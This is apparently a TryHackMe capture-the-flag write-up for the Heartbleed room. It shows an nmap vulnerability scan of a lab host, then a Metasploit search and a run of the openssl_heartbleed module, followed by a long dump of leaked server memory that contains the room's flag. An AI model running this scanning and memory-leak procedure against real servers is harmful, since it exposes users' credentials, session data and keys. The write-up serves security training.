# [TryHackMe | Heartbleed](https://tryhackme.com/room/heartbleed) Challenge Room Solution Writeup

## [Task 2 Protecting Data in Transit](https://tryhackme.com/room/heartbleed?taskNo=2)

Use `nmap` to scan vulnerabilities of the TARGET_IP.

```bash
nmap -sV --script vuln TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-31 21:14 UTC
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00020s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|     	DF059135-2CF5-5441-8F22-E6EF1DEE5F6E	10.0	https://vulners.com/gitee/DF059135-2CF5-5441-8F22-E6EF1DEE5F6E	*EXPLOIT*
|     	260BB20D-7E01-5A22-AD21-20F63E8EC7CE	10.0	https://vulners.com/githubexploit/260BB20D-7E01-5A22-AD21-20F63E8EC7CE	*EXPLOIT*
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	CEF8EC43-BFE2-5B5E-8918-54A90DA092B4	9.8	https://vulners.com/githubexploit/CEF8EC43-BFE2-5B5E-8918-54A90DA092B4	*EXPLOIT*
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	A2B36B85-C737-548F-8C04-9339EDCDBFF5	9.8	https://vulners.com/githubexploit/A2B36B85-C737-548F-8C04-9339EDCDBFF5	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	6192C35D-F78B-5C0A-AB8D-9826A79A5320	9.8	https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	CVE-2026-60002	9.4	https://vulners.com/cve/CVE-2026-60002
|     	CVE-2026-35414	8.1	https://vulners.com/cve/CVE-2026-35414
|     	CVE-2026-35386	8.1	https://vulners.com/cve/CVE-2026-35386
|     	CVE-2026-35385	8.1	https://vulners.com/cve/CVE-2026-35385
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	7.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	991D2CC4-0E09-5745-97A2-4917461BD6EC	7.8	https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC	*EXPLOIT*
|     	2E719186-2FED-58A8-A150-762EFBAAA523	7.8	https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523	*EXPLOIT*
|     	23CC97BE-7C95-513B-9E73-298C48D74432	7.8	https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	7.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	CVE-2026-60000	7.5	https://vulners.com/cve/CVE-2026-60000
|     	CVE-2026-59999	7.5	https://vulners.com/cve/CVE-2026-59999
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	EDB-ID:46516	6.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	6.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	CVE-2019-6110	6.8	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	6.8	https://vulners.com/cve/CVE-2019-6109
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
|     	1337DAY-ID-32328	6.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	6.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	DB7C1CC7-4DB6-55E0-BC0B-5059FBF3AE16	6.5	https://vulners.com/githubexploit/DB7C1CC7-4DB6-55E0-BC0B-5059FBF3AE16	*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2026-60001	6.5	https://vulners.com/cve/CVE-2026-60001
|     	CVE-2026-59998	6.5	https://vulners.com/cve/CVE-2026-59998
|     	CVE-2026-35387	6.5	https://vulners.com/cve/CVE-2026-35387
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	PACKETSTORM:181223	5.9	https://vulners.com/packetstorm/PACKETSTORM:181223	*EXPLOIT*
|     	MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	5.9	https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	*EXPLOIT*
|     	FEF0EB06-770B-5ADF-857C-1704B7AC3FE4	5.9	https://vulners.com/githubexploit/FEF0EB06-770B-5ADF-857C-1704B7AC3FE4	*EXPLOIT*
|     	FD2E0EBA-ED84-5304-8862-84BCDEB2F288	5.9	https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288	*EXPLOIT*
|     	EDB-ID:45939	5.9	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.9	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:45210	5.9	https://vulners.com/exploitdb/EDB-ID:45210	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6111	5.9	https://vulners.com/cve/CVE-2019-6111
|     	CVE-2018-15473	5.9	https://vulners.com/cve/CVE-2018-15473
|     	CNVD-2021-25272	5.9	https://vulners.com/cnvd/CNVD-2021-25272
|     	C7606007-4561-5AC5-8597-A7DF7A3C1D59	5.9	https://vulners.com/githubexploit/C7606007-4561-5AC5-8597-A7DF7A3C1D59	*EXPLOIT*
|     	999F3EF8-6D45-5F10-A4C8-6185D82D4552	5.9	https://vulners.com/githubexploit/999F3EF8-6D45-5F10-A4C8-6185D82D4552	*EXPLOIT*
|     	721F040C-37BC-59E1-9433-01A2EAC2E755	5.9	https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755	*EXPLOIT*
|     	6D74A425-60A7-557A-B469-1DD96A2D8FF8	5.9	https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	CVE-2026-59997	5.4	https://vulners.com/cve/CVE-2026-59997
|     	CVE-2026-59996	5.4	https://vulners.com/cve/CVE-2026-59996
|     	CVE-2026-59995	5.4	https://vulners.com/cve/CVE-2026-59995
|     	FD18B68B-C0A6-562E-A8C8-781B225F15B0	5.3	https://vulners.com/githubexploit/FD18B68B-C0A6-562E-A8C8-781B225F15B0	*EXPLOIT*
|     	E9EC0911-E2E1-52A7-B2F4-D0065C6A3057	5.3	https://vulners.com/githubexploit/E9EC0911-E2E1-52A7-B2F4-D0065C6A3057	*EXPLOIT*
|     	CVE-2018-20685	5.3	https://vulners.com/cve/CVE-2018-20685
|     	CVE-2018-15919	5.3	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2017-15906	5.3	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CNVD-2018-20962	5.3	https://vulners.com/cnvd/CNVD-2018-20962
|     	CNVD-2018-20960	5.3	https://vulners.com/cnvd/CNVD-2018-20960
|     	A9E6F50E-E7FC-51D0-9C93-A43461469FA2	5.3	https://vulners.com/githubexploit/A9E6F50E-E7FC-51D0-9C93-A43461469FA2	*EXPLOIT*
|     	A801235B-9835-5BA8-B8FE-23B7FFCABD66	5.3	https://vulners.com/githubexploit/A801235B-9835-5BA8-B8FE-23B7FFCABD66	*EXPLOIT*
|     	8DD1D813-FD5A-5B26-867A-CE7CAC9FEEDF	5.3	https://vulners.com/gitee/8DD1D813-FD5A-5B26-867A-CE7CAC9FEEDF	*EXPLOIT*
|     	4F2FBB06-E601-5EAD-9679-3395D24057DD	5.3	https://vulners.com/githubexploit/4F2FBB06-E601-5EAD-9679-3395D24057DD	*EXPLOIT*
|     	486BB6BC-9C26-597F-B865-D0E904FDA984	5.3	https://vulners.com/githubexploit/486BB6BC-9C26-597F-B865-D0E904FDA984	*EXPLOIT*
|     	2385176A-820F-5469-AB09-C340264F2B2F	5.3	https://vulners.com/gitee/2385176A-820F-5469-AB09-C340264F2B2F	*EXPLOIT*
|     	1337DAY-ID-31730	5.3	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	CVE-2026-73282	4.8	https://vulners.com/cve/CVE-2026-73282
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|     	CVE-2026-73281	3.5	https://vulners.com/cve/CVE-2026-73281
|     	CVE-2026-73283	2.5	https://vulners.com/cve/CVE-2026-73283
|     	CVE-2026-35388	2.5	https://vulners.com/cve/CVE-2026-35388
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
111/tcp open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46299/tcp6  status
|   100024  1          48197/tcp   status
|   100024  1          56607/udp   status
|_  100024  1          59658/udp6  status
443/tcp open  ssl/http nginx 1.15.7
|_http-csrf: couldn"'"t find any CSRF vulnerabilities.
|_http-stored-xss: couldn"'"t find any stored XSS vulnerabilities.
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/
|_http-dombased-xss: couldn"'"t find any DOM based XSS.
|_http-server-header: nginx/1.15.7
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
MAC Address: 02:D8:DD:21:0D:09 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.99 seconds
```

Initiate the `Metasploit` session with `msfconsole` and use `search` to find potential `Heartbleed` exploits.

```bash
msf > search heartbleed

Matching Modules
================

   #  Full Name                                               Disclosure Date  Rank    Check  Name
   -  ---------                                               ---------------  ----    -----  ----
   0  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal  Yes    Elasticsearch Memory Disclosure
   1    \_ action: DUMP                                       .                .       .      Dump memory contents to loot
   2    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability
   3  auxiliary/server/openssl_heartbeat_client_memory        2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   4  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   5    \_ action: DUMP                                       .                .       .      Dump memory contents to loot
   6    \_ action: KEYS                                       .                .       .      Recover private keys from memory
   7    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability
```

For this task choose `auxiliary/scanner/ssl/openssl_heartbleed`, `set` the parameters accordingly, then `run`.

```bash
msf > use auxiliary/scanner/ssl/openssl_heartbleed 
[*] Setting default action SCAN - view all 3 actions with the show actions command

msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS TARGET_IP
RHOSTS => TARGET_IP

msf auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE True
VERBOSE => true

msf auxiliary(scanner/ssl/openssl_heartbleed) > show options
Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocati
                                                on
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS            TARGET_IP        yes       The target host(s), see https://docs.metasploit.com/docs
                                                /using-metasploit/basics/using-metasploit.html
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted
                                                : None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)

Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability

msf auxiliary(scanner/ssl/openssl_heartbleed) > run
[*] TARGET_IP:443      - Leaking heartbeat response #1
[*] TARGET_IP:443      - Sending Client Hello...
[*] TARGET_IP:443      - SSL record #1:
[*] TARGET_IP:443      - 	Type:    22
[*] TARGET_IP:443      - 	Version: 0x0301
[*] TARGET_IP:443      - 	Length:  86
[*] TARGET_IP:443      - 	Handshake #1:
[*] TARGET_IP:443      - 		Length: 82
[*] TARGET_IP:443      - 		Type:   Server Hello (2)
[*] TARGET_IP:443      - 		Server Hello Version:           0x0301
[*] TARGET_IP:443      - 		Server Hello random data:       5682f32742b3709cd402b9ab226c65984de7301a682d2ff76b482843be0b8635
[*] TARGET_IP:443      - 		Server Hello Session ID length: 32
[*] TARGET_IP:443      - 		Server Hello Session ID:        9cb0f1a4c792c9fc999604a75d0ad35edb1b77554a336b631c44a74c0cea2083
[*] TARGET_IP:443      - SSL record #2:
[*] TARGET_IP:443      - 	Type:    22
[*] TARGET_IP:443      - 	Version: 0x0301
[*] TARGET_IP:443      - 	Length:  951
[*] TARGET_IP:443      - 	Handshake #1:
[*] TARGET_IP:443      - 		Length: 947
[*] TARGET_IP:443      - 		Type:   Certificate Data (11)
[*] TARGET_IP:443      - 		Certificates length: 944
[*] TARGET_IP:443      - 		Data length: 947
[*] TARGET_IP:443      - 		Certificate #1:
[*] TARGET_IP:443      - 			Certificate #1: Length: 941
[*] TARGET_IP:443      - 			Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007d35c7e21e20>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
[*] TARGET_IP:443      - SSL record #3:
[*] TARGET_IP:443      - 	Type:    22
[*] TARGET_IP:443      - 	Version: 0x0301
[*] TARGET_IP:443      - 	Length:  331
[*] TARGET_IP:443      - 	Handshake #1:
[*] TARGET_IP:443      - 		Length: 327
[*] TARGET_IP:443      - 		Type:   Server Key Exchange (12)
[*] TARGET_IP:443      - SSL record #4:
[*] TARGET_IP:443      - 	Type:    22
[*] TARGET_IP:443      - 	Version: 0x0301
[*] TARGET_IP:443      - 	Length:  4
[*] TARGET_IP:443      - 	Handshake #1:
[*] TARGET_IP:443      - 		Length: 0
[*] TARGET_IP:443      - 		Type:   Server Hello Done (14)
[*] TARGET_IP:443      - Sending Heartbeat...
[*] TARGET_IP:443      - Heartbeat response, 65535 bytes
[+] TARGET_IP:443      - Heartbeat response with leak, 65535 bytes
[*] TARGET_IP:443      - Printable info leaked:
......j...&..K....\h...D.%.~..Y%...sj...f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................6 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}>.\p eBh.ZC.}....S...........X.J.C.....%.....f...9...............M.......r.......B...&.......1...Y...................R.......-...Y.+.'.).......Z...K.0...5.<.L.m.....~.i.t.......].H.......}.~...{...s...y.>.x.u.F.....V.r.....=.......2.A.q...p.o.n...k.7.:.m.,.f.e.......`..._.d.^.U.W...V...S.........O.......L.#.....l.G.....T...g.w.......3...../.*...N.)...C.(.$.!. .c.=...........6.z.......O.!.k.K.....;.D.M...........+...".........3...y.......5.........7...j...i.e.`...Z.}...h.F...B.\.8.J.E.0...........'.............}a.....]g^.mB.|u_\...'.E5#R.. N.t...].|.......~..g.q.Xu.3.D...+)...n..........AD.q.D....[.....VI.......... y.......l.r.9.c.X...3..t....z...Wc..S.....c.m..u*.z.....K..................................................................................................................................... repeated 15087 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................A....K..+.Y0.....D.M.1oIT.......Os.b>.--.".bX.XD.....Y.{....Q 5..d..5...g.n......I.b.AE'*.'....q-..<..\H...4&.aa.+..j ..;..x.]T[..KOe...QVH.;y.gHW..t.?.k..=U....r.Oo.NN.....3)a......... ...T.,....x9_..d....}.P.....].....1C~...6..0.I...u.4.I..-.Y...'.W8......<.DG.D..."..#......!...X.......U.I..F.g..=/.g...Y..F.'02"..w*-..0?..OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C.................................h.w.....0.w.....................0...............0.w.......w.......w.....................0...............0.w.............................................................................................`.w.....................0.w...............................r.............................................................................................................................................0.i\....................2..j....*...............................P.q...............w...............................w.............T.q.............P.q.............V.q...............................w...............................................................w.......................................................................q.............".G...............3......@. ............................................................`.q.....................`.q.....T.q.....U.q.....................P.q.....^.q.....R.q...............................................................................`...............w.......k}{.....................`...............`.......q.......................................................................................................................................................................................................................................q.......q.....................................................................................................................................................................................................................................................................................................................................................p.......0.................w.............................1.........w..... .w.....................0-.......>......H;......(,.......7.......7.......,.......B.......B......p5........................................k}{....+r..................................................................................................................................... repeated 325 times .....................................................................................................................................w...............................................................................................q........@....................P.q........@...............@............/usr/local/nginx/html/index.html./usr/local/nginx/html/index.html........>D.......w.......................w.......q....."5c69a630-21e"............................................................................................w............................. .........w.......................................................................................................................................................................q...............w.......w.......................w.......w.....................................HTTP/1.1 200 OK..Server: nginx/1.15.7..Date: Mon, 31 Aug 2026 21:16:34 GMT..Content-Type: text/html..Content-Length: 542..Last-Modified: Sun, 17 Feb 2019 18:21:36 GMT..Connection: close..ETag: "5c69a630-21e"..Accept-Ranges: bytes...........................`.w...............................x.............................0.w..............................u......L.I.......w......................@..........V...R...;D...m...=...f...T..;.....[.43. .P..~.....M.MQ.......^Im;=....................................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A..t.q..1^...z./....u...nR..PY.%.^GJpP=.Fc......{.Pz.X.....d.e......L..."...M...t......d......8...i.I..^.W..{.....T.e..i....~.{.ST...G..........k.y.>.2.%...F....].t.1..7.................pv....(Kz....>.U.KJ#..L...|w8...{"...{&...W..ZYSr.........l....._&.1..x....6w..idm...u?.k..m.....I..T........i.).E.e. `...|E/...."...;<jn3..................................................................................................................................... repeated 2456 times .....................................................................................................................................0........k}{.....k}{...@.w.....@.w.....................................................................................................................................................................................................................................................................................odified:..........k}{.....k}{...................on: keep-alive..ETag: "5c69a630-21e"..Accept-Ranges: bytes........................w...............................x...............................w..............................u......L.I.......w...............................x.......x.......................0...............r...............r.......w..................................................................................................................................... repeated 436 times .....................................................................................................................................*........k}{.....k}{.....w.......w.......................................................................................................................................................................................w...............w.......w.......................w.......x......u........w.....................<!DOCTYPE html>.<html>.<head>.<title>What are you looking for?</title>.<style>.    body {.        width: 35em;.        margin: 0 auto;.        font-family: Tahoma, Verdana, Arial, sans-serif;.    }.</style>.</head>.<body>.<h1> Who said static pages aren't fun right? </h1>.<video width="560" height="315" controls>.  <source src="heartbleed-song.mp4" type="video/mp4">.</video>.<p> My friend really like this Heartbleed song - I think you all will like it too </p>..<!-- don't forget to remove secret communication pages -->..</body>.</html>.....w...............w.......w.....10.66.124.124 - - [31/Aug/2026:21:16:34 +0000] "GET / HTTP/1.1" 200 542 "-" "-"..................................................................................................................................... repeated 2103 times .....................................................................................................................................8.k}{...8.k}{.....x.......x..................................................................................................................................... repeated 2422 times .....................................................................................................................................@..................................................................................................................................... repeated 161 times .....................................................................................................................................k}{.....k}{... .w..... .w.............0.w.......x...............w.......q.....HTTP.....P5~{.....w......Sq.....h.r.......r.....f.G.....f.G.......................................q.......w.....p(x.....................0...............0.w.............................................................................................................................................................................................................................\.a.....................................................................................................h.w.....0.w.....................0...............0.w.......w.......w.....................0...............0.w.............................................................................................`.w.....................0.w...............................r.............................................................................................................................................0.i\....................2..j....*...............................P.q...............w...............................w.............T.q.............P.q.............V.q...............................w...............................................................w.......................................................................q.............".G...............3......@. ............................................................`.q.....................`.q.....T.q.....U.q.....................P.q.....^.q.....R.q...............................................................................`...............w.......k}{.....................`...............`.......q.......................................................................................................................................................................................................................................q.......q.....................................................................................................................................................................................................................................................................................................................................................p.......0.................w.............................1.........w..... .w.....................0-.......>......H;......(,.......7.......7.......,.......B.......B......p5........................................k}{....+r..................................................................................................................................... repeated 325 times .....................................................................................................................................w...............................................................................................q........@....................P.q........@...............@............/usr/local/nginx/html/index.html./usr/local/nginx/html/index.html........>D.......w.......................w.......q....."5c69a630-21e"............................................................................................w............................. .........w.......................................................................................................................................................................q...............w.......w.......................w.......w.....................................HTTP/1.1 200 OK..Server: nginx/1.15.7..Date: Mon, 31 Aug 2026 21:16:34 GMT..Content-Type: text/html..Content-Length: 542..Last-Modified: Sun, 17 Feb 2019 18:21:36 GMT..Connection: close..ETag: "5c69a630-21e"..Accept-Ranges: bytes...........................`.w...............................x.............................0.w..............................u......L.I.......w......................@..........V...R..V..'B.p....."le.M.0.h-/.kH(C...5 ............]..^..wUJ3kc.D.L.. 